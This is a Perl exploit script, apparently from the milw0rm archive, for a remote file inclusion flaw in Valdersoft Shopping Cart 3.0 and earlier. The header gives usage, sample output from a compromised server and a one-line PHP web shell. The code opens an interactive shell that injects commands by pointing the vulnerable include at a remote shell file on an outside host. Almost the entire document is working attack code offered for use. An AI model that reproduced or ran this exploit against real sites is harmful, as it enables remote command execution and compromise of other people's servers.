#!/usr/bin/perl
#
# cijfer-vscxpl - Valdersoft Shopping Cart <=3.0 Remote Command Execution Exploit
#
# Copyright (c) 2005 cijfer <cijfer@netti.fi>
# All rights reserved.           
#
## 1. example
#
# [cijfer@kalma:/research]$ ./cijfer-vscxpl.pl -h www.valdersoft.com -d /store
# [cijfer@www.valdersoft.com /]$ id;uname -a
# uid=2526(apache) gid=2524(apache) groups=2524(apache), 10004(psaserv)
# FreeBSD valdersoft.com 4.9-RELEASE FreeBSD 4.9-RELEASE #0: Wed Nov 19 00:35:22 EST 2003     
# tim@temp.atlnetworks.com:/usr/src/sys/compile/PLESK  i386
# 
# [cijfer@www.valdersoft.com /]$ 
#
## 2. explanation
#
# various files within 'include\templates\categories' contains unsanitized and undefined
# variables which can allow remote file inclusion, leading to remote command execution.
# this can be done by entering a remote url within the 'catalogDocumentRoot' variable.
#
## 3. the bug
#
# this is obvious _why_ it is dangerous.
#
#       ...
#       include($catalogDocumentRoot.$catalogDir."include/modules/categories_path.php");
#       ...
#
## 4. the php shell
#
# this exploit grabs data via regular expression strings. foreign php shell
# scripts will not work with this exploit. use the following code along with
# this exploit and put it in 'cmd.txt' or whatever you please:
#
#       <?passthru($_GET[cmd]);?>
#
##
#
# $Id: cijfer-vscxpl.pl,v 0.2 2005/12/30 11:44:00 cijfer Exp cijfer $

use Getopt::Std;
use IO::Socket;
use URI::Escape;

getopts("h:d:");

$host = $opt_h;
$dirs = $opt_d;
$shel = "http://site.com/cmd.txt";       # cmd shell url
$cmdv = "cmd";                           # cmd variable (ex. passthru($_GET[cmd]);)
$good = 0;

if(!$host||!$dirs)
{
        print "cijfer-vscxpl.pl by cijfer\n";
        print "usage: $0 -h cijfer.xxx -d /valdersoft\r\n";
        print "usage: $0 -h <hostname> -d <directory>\r\n";
        exit();
}

while()
{
        print "[cijfer@".$host." /]\$ ";
        while(<STDIN>)
        {
                $cmds=$_;
                chomp($cmds);
                last;
        }

        $string  = $dirs;
        $string .= "/include/templates/categories/default.php?";
        $string .= uri_escape($cmdv);
        $string .= "=";
        $string .= "%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B";
        $string .= uri_escape($cmds).";echo";
        $string .= "%3B%65%63%68%6F%20%5F%45%4E%44%5F;echo;";
        $string .= "&catalogDocumentRoot=";
        $string .= $shel;
        $string .= "?";

        $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => 80) || die "error: connect()\n";

        print $sock "GET $string HTTP/1.1\n";
        print $sock "Host: $host\n";
        print $sock "Accept: */*\n";
        print $sock "Connection: close\n\n";

        while($result = <$sock>)
        {
                if($result =~ /^_END_/)
                {
                        $good=0;
                }

                if($good==1)
                {
                        print $result;
                }

                if($result =~ /^_START_/)
                {
                        $good=1;
                }
        }
}

# milw0rm.com [2006-01-03]
